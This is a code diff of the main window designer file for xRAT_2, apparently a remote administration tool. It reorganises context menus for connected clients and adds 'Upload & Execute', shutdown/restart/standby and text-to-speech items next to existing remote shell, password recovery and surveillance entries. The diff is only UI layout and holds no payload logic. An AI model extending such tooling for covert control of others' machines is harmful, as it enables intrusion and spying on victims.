@@ -38,16 +38,23 @@
             this.ctxtUninstall = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtSystem = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtSystemInformation = new System.Windows.Forms.ToolStripMenuItem();
-            this.ctxtDownloadAndExecute = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtTaskManager = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtFileManager = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtPasswordRecovery = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtRemoteShell = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtLine = new System.Windows.Forms.ToolStripSeparator();
+            this.ctxtActions = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtShutdown = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtRestart = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtStandby = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtSurveillance = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtRemoteDesktop = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtMiscellaneous = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtDownloadAndExecute = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtUploadAndExecute = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtVisitWebsite = new System.Windows.Forms.ToolStripMenuItem();
             this.ctxtShowMessagebox = new System.Windows.Forms.ToolStripMenuItem();
+            this.ctxtTextToSpeech = new System.Windows.Forms.ToolStripMenuItem();
             this.botStrip = new System.Windows.Forms.StatusStrip();
             this.botListen = new System.Windows.Forms.ToolStripStatusLabel();
             this.imgFlags = new System.Windows.Forms.ImageList(this.components);
@@ -130,11 +137,12 @@
             // 
             this.ctxtSystem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.ctxtSystemInformation,
-            this.ctxtDownloadAndExecute,
             this.ctxtTaskManager,
             this.ctxtFileManager,
             this.ctxtPasswordRecovery,
-            this.ctxtRemoteShell});
+            this.ctxtRemoteShell,
+            this.ctxtLine,
+            this.ctxtActions});
             this.ctxtSystem.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystem.Image")));
             this.ctxtSystem.Name = "ctxtSystem";
             this.ctxtSystem.Size = new System.Drawing.Size(149, 22);
@@ -144,23 +152,15 @@
             // 
             this.ctxtSystemInformation.Image = ((System.Drawing.Image)(resources.GetObject("ctxtSystemInformation.Image")));
             this.ctxtSystemInformation.Name = "ctxtSystemInformation";
-            this.ctxtSystemInformation.Size = new System.Drawing.Size(184, 22);
+            this.ctxtSystemInformation.Size = new System.Drawing.Size(178, 22);
             this.ctxtSystemInformation.Text = "System Information";
             this.ctxtSystemInformation.Click += new System.EventHandler(this.ctxtSystemInformation_Click);
-            // 
-            // ctxtDownloadAndExecute
-            // 
-            this.ctxtDownloadAndExecute.Image = ((System.Drawing.Image)(resources.GetObject("ctxtDownloadAndExecute.Image")));
-            this.ctxtDownloadAndExecute.Name = "ctxtDownloadAndExecute";
-            this.ctxtDownloadAndExecute.Size = new System.Drawing.Size(184, 22);
-            this.ctxtDownloadAndExecute.Text = "Download && Execute";
-            this.ctxtDownloadAndExecute.Click += new System.EventHandler(this.ctxtDownloadAndExecute_Click);
             // 
             // ctxtTaskManager
             // 
             this.ctxtTaskManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtTaskManager.Image")));
             this.ctxtTaskManager.Name = "ctxtTaskManager";
-            this.ctxtTaskManager.Size = new System.Drawing.Size(184, 22);
+            this.ctxtTaskManager.Size = new System.Drawing.Size(178, 22);
             this.ctxtTaskManager.Text = "Task Manager";
             this.ctxtTaskManager.Click += new System.EventHandler(this.ctxtTaskManager_Click);
             // 
@@ -168,7 +168,7 @@
             // 
             this.ctxtFileManager.Image = ((System.Drawing.Image)(resources.GetObject("ctxtFileManager.Image")));
             this.ctxtFileManager.Name = "ctxtFileManager";
-            this.ctxtFileManager.Size = new System.Drawing.Size(184, 22);
+            this.ctxtFileManager.Size = new System.Drawing.Size(178, 22);
             this.ctxtFileManager.Text = "File Manager";
             this.ctxtFileManager.Click += new System.EventHandler(this.ctxtFileManager_Click);
             // 
@@ -177,7 +177,7 @@
             this.ctxtPasswordRecovery.Enabled = false;
             this.ctxtPasswordRecovery.Image = ((System.Drawing.Image)(resources.GetObject("ctxtPasswordRecovery.Image")));
             this.ctxtPasswordRecovery.Name = "ctxtPasswordRecovery";
-            this.ctxtPasswordRecovery.Size = new System.Drawing.Size(184, 22);
+            this.ctxtPasswordRecovery.Size = new System.Drawing.Size(178, 22);
             this.ctxtPasswordRecovery.Text = "Password Recovery";
             this.ctxtPasswordRecovery.Click += new System.EventHandler(this.ctxtPasswordRecovery_Click);
             // 
@@ -185,9 +185,49 @@
             // 
             this.ctxtRemoteShell.Image = ((System.Drawing.Image)(resources.GetObject("ctxtRemoteShell.Image")));
             this.ctxtRemoteShell.Name = "ctxtRemoteShell";
-            this.ctxtRemoteShell.Size = new System.Drawing.Size(184, 22);
+            this.ctxtRemoteShell.Size = new System.Drawing.Size(178, 22);
             this.ctxtRemoteShell.Text = "Remote Shell";
             this.ctxtRemoteShell.Click += new System.EventHandler(this.ctxtRemoteShell_Click);
+            // 
+            // ctxtLine
+            // 
+            this.ctxtLine.Name = "ctxtLine";
+            this.ctxtLine.Size = new System.Drawing.Size(175, 6);
+            // 
+            // ctxtActions
+            // 
+            this.ctxtActions.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.ctxtShutdown,
+            this.ctxtRestart,
+            this.ctxtStandby});
+            this.ctxtActions.Image = global::xRAT_2.Properties.Resources.actions;
+            this.ctxtActions.Name = "ctxtActions";
+            this.ctxtActions.Size = new System.Drawing.Size(178, 22);
+            this.ctxtActions.Text = "Actions";
+            // 
+            // ctxtShutdown
+            // 
+            this.ctxtShutdown.Image = global::xRAT_2.Properties.Resources.shutdown;
+            this.ctxtShutdown.Name = "ctxtShutdown";
+            this.ctxtShutdown.Size = new System.Drawing.Size(128, 22);
+            this.ctxtShutdown.Text = "Shutdown";
+            this.ctxtShutdown.Click += new System.EventHandler(this.ctxtShutdown_Click);
+            // 
+            // ctxtRestart
+            // 
+            this.ctxtRestart.Image = global::xRAT_2.Properties.Resources.restart;
+            this.ctxtRestart.Name = "ctxtRestart";
+            this.ctxtRestart.Size = new System.Drawing.Size(128, 22);
+            this.ctxtRestart.Text = "Restart";
+            this.ctxtRestart.Click += new System.EventHandler(this.ctxtRestart_Click);
+            // 
+            // ctxtStandby
+            // 
+            this.ctxtStandby.Image = global::xRAT_2.Properties.Resources.standby;
+            this.ctxtStandby.Name = "ctxtStandby";
+            this.ctxtStandby.Size = new System.Drawing.Size(128, 22);
+            this.ctxtStandby.Text = "Standby";
+            this.ctxtStandby.Click += new System.EventHandler(this.ctxtStandby_Click);
             // 
             // ctxtSurveillance
             // 
@@ -209,18 +249,37 @@
             // ctxtMiscellaneous
             // 
             this.ctxtMiscellaneous.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.ctxtDownloadAndExecute,
+            this.ctxtUploadAndExecute,
             this.ctxtVisitWebsite,
-            this.ctxtShowMessagebox});
+            this.ctxtShowMessagebox,
+            this.ctxtTextToSpeech});
             this.ctxtMiscellaneous.Image = ((System.Drawing.Image)(resources.GetObject("ctxtMiscellaneous.Image")));
             this.ctxtMiscellaneous.Name = "ctxtMiscellaneous";
             this.ctxtMiscellaneous.Size = new System.Drawing.Size(149, 22);
             this.ctxtMiscellaneous.Text = "Miscellaneous";
             // 
+            // ctxtDownloadAndExecute
+            // 
+            this.ctxtDownloadAndExecute.Image = ((System.Drawing.Image)(resources.GetObject("ctxtDownloadAndExecute.Image")));
+            this.ctxtDownloadAndExecute.Name = "ctxtDownloadAndExecute";
+            this.ctxtDownloadAndExecute.Size = new System.Drawing.Size(184, 22);
+            this.ctxtDownloadAndExecute.Text = "Download && Execute";
+            this.ctxtDownloadAndExecute.Click += new System.EventHandler(this.ctxtDownloadAndExecute_Click);
+            // 
+            // ctxtUploadAndExecute
+            // 
+            this.ctxtUploadAndExecute.Image = global::xRAT_2.Properties.Resources.upload;
+            this.ctxtUploadAndExecute.Name = "ctxtUploadAndExecute";
+            this.ctxtUploadAndExecute.Size = new System.Drawing.Size(184, 22);
+            this.ctxtUploadAndExecute.Text = "Upload && Execute";
+            this.ctxtUploadAndExecute.Click += new System.EventHandler(this.ctxtUploadAndExecute_Click);
+            // 
             // ctxtVisitWebsite
             // 
             this.ctxtVisitWebsite.Image = ((System.Drawing.Image)(resources.GetObject("ctxtVisitWebsite.Image")));
             this.ctxtVisitWebsite.Name = "ctxtVisitWebsite";
-            this.ctxtVisitWebsite.Size = new System.Drawing.Size(171, 22);
+            this.ctxtVisitWebsite.Size = new System.Drawing.Size(184, 22);
             this.ctxtVisitWebsite.Text = "Visit Website";
             this.ctxtVisitWebsite.Click += new System.EventHandler(this.ctxtVisitWebsite_Click);
             // 
@@ -228,15 +287,23 @@
             // 
             this.ctxtShowMessagebox.Image = ((System.Drawing.Image)(resources.GetObject("ctxtShowMessagebox.Image")));
             this.ctxtShowMessagebox.Name = "ctxtShowMessagebox";
-            this.ctxtShowMessagebox.Size = new System.Drawing.Size(171, 22);
+            this.ctxtShowMessagebox.Size = new System.Drawing.Size(184, 22);
             this.ctxtShowMessagebox.Text = "Show Messagebox";
             this.ctxtShowMessagebox.Click += new System.EventHandler(this.ctxtShowMessagebox_Click);
+            // 
+            // ctxtTextToSpeech
+            // 
+            this.ctxtTextToSpeech.Image = global::xRAT_2.Properties.Resources.sound;
+            this.ctxtTextToSpeech.Name = "ctxtTextToSpeech";
+            this.ctxtTextToSpeech.Size = new System.Drawing.Size(184, 22);
+            this.ctxtTextToSpeech.Text = "Text to Speech";
+            this.ctxtTextToSpeech.Click += new System.EventHandler(this.ctxtTextToSpeech_Click);
             // 
             // botStrip
             // 
             this.botStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
             this.botListen});
-            this.botStrip.Location = new System.Drawing.Point(0, 355);
+            this.botStrip.Location = new System.Drawing.Point(0, 366);
             this.botStrip.Name = "botStrip";
             this.botStrip.Size = new System.Drawing.Size(770, 22);
             this.botStrip.TabIndex = 4;
@@ -525,7 +592,7 @@
             this.lstClients.GridLines = true;
             this.lstClients.Location = new System.Drawing.Point(0, 0);
             this.lstClients.Name = "lstClients";
-            this.lstClients.Size = new System.Drawing.Size(770, 377);
+            this.lstClients.Size = new System.Drawing.Size(770, 388);
             this.lstClients.SmallImageList = this.imgFlags;
             this.lstClients.TabIndex = 1;
             this.lstClients.UseCompatibleStateImageBehavior = false;
@@ -622,13 +689,12 @@
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(770, 377);
+            this.ClientSize = new System.Drawing.Size(770, 388);
             this.Controls.Add(this.botStrip);
             this.Controls.Add(this.lstClients);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.ForeColor = System.Drawing.Color.Black;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
-            this.Menu = this.mainMenu;
             this.MinimumSize = new System.Drawing.Size(680, 415);
             this.Name = "frmMain";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
@@ -683,6 +749,13 @@
         private System.Windows.Forms.ToolStripMenuItem ctxtRemoteShell;
         public Controls.ListViewEx lstClients;
         public System.Windows.Forms.NotifyIcon nIcon;
+        private System.Windows.Forms.ToolStripSeparator ctxtLine;
+        private System.Windows.Forms.ToolStripMenuItem ctxtActions;
+        private System.Windows.Forms.ToolStripMenuItem ctxtShutdown;
+        private System.Windows.Forms.ToolStripMenuItem ctxtRestart;
+        private System.Windows.Forms.ToolStripMenuItem ctxtStandby;
+        private System.Windows.Forms.ToolStripMenuItem ctxtUploadAndExecute;
+        private System.Windows.Forms.ToolStripMenuItem ctxtTextToSpeech;
     }
 }
 
